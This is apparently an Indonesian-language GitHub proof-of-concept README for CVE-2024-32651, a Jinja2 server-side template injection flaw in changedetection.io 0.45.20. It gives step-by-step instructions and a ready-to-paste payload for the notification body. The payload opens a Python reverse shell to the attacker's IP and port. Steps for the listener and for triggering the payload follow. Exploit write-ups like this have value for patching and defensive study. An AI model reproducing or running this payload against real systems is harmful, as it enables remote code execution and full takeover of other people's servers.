# CHANGEDETECTION.io 0.45.20

# Cara Kerja
ChangeDetection.io bekerja dengan cara mengambil snapshot dari halaman web yang dipantau pada interval waktu tertentu, lalu membandingkannya dengan snapshot sebelumnya untuk mendeteksi perubahan. Pengguna dapat menentukan URL halaman yang ingin dipantau untuk memantau area tertentu saja. Ketika perubahan terdeteksi, sistem akan mengirimkan notifikasi melalui metode yang dipilih, seperti Discord, Email, Slack, Telegram, API calls, dan lainnya. 

# Kerentanan
Kerentanan Server-Side Template Injection (SSTI) pada aplikasi changedetection.io yang menggunakan mesin template Jinja2. Kerentanan ini memungkinkan penyerang melakukan Remote Command Execution (RCE) pada host server, memberikan mereka kemampuan untuk menjalankan perintah sistem tanpa batasan, termasuk kemungkinan penggunaan reverse shell. Dampaknya sangat kritis karena penyerang dapat mengambil alih sepenuhnya mesin server.

# Langkah-langkah
*Sebelum memulai, jalankan web server anda (http.server)*

1. Intro (silahkan login menggunakan kata sandi anda)
![Screenshot 2025-01-04 104116](https://github.com/user-attachments/assets/69d6858a-e9c7-44b3-a01a-93df091e5e9b)

2. Setelah Masuk, masukan alamat pada url kemudian klik "Watch". Setelah itu klik "edit"
![Screenshot 2025-01-04 204927](https://github.com/user-attachments/assets/25c8a380-9eab-4b83-94e4-df7ca405d186)

3. Pada tab "General", masukkan kembali url ke web server anda. Setelah itu set Time -> "Seconds = 30". Klik tab "Notifications"
   *pastikan "Send a notification .." di centang*

4. Pada "Notification URL List", input "gets://<ip>". Pada bagian "Notification Body", copy & paste payload dan ubah IP serta port.

*payload: {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}*

SAVE!!
(Kembali ke Dashboard)

# Langkah untuk mendapatkan Reverse Shell

1. Aktifkan listener, masukkan port sesuai dengan port yang telah ditentukan pada payload sebelumnya
2. Tambahkan sebuah file pada direktori di "/home/user/" (pada kasus saya,  silahkan sesuaikan dengan kondisi anda)
3. Klik "Recheck" pada bagian alamat website anda.
4. Perhatikan listener anda!

*jika gagal, lanjut poin 5*

5. Reload dashboard
6. Hapus file pada direktori di pc
7. Kembali ke web, centang bagian alamat website anda, kemudian klik "Recheck"
*Jika masih gagal, perhatikan video dibawah*

# PoC
https://github.com/user-attachments/assets/af73e1cd-b55d-480d-8f9e-0129ded43b75

Sumber :
- [CVE Details](https://www.cvedetails.com/cve/CVE-2024-32651)
- [Hacktive Security](https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io)
- [Cyber Material](https://cybermaterial.com/server-side-template-injection-with-jinja2/)
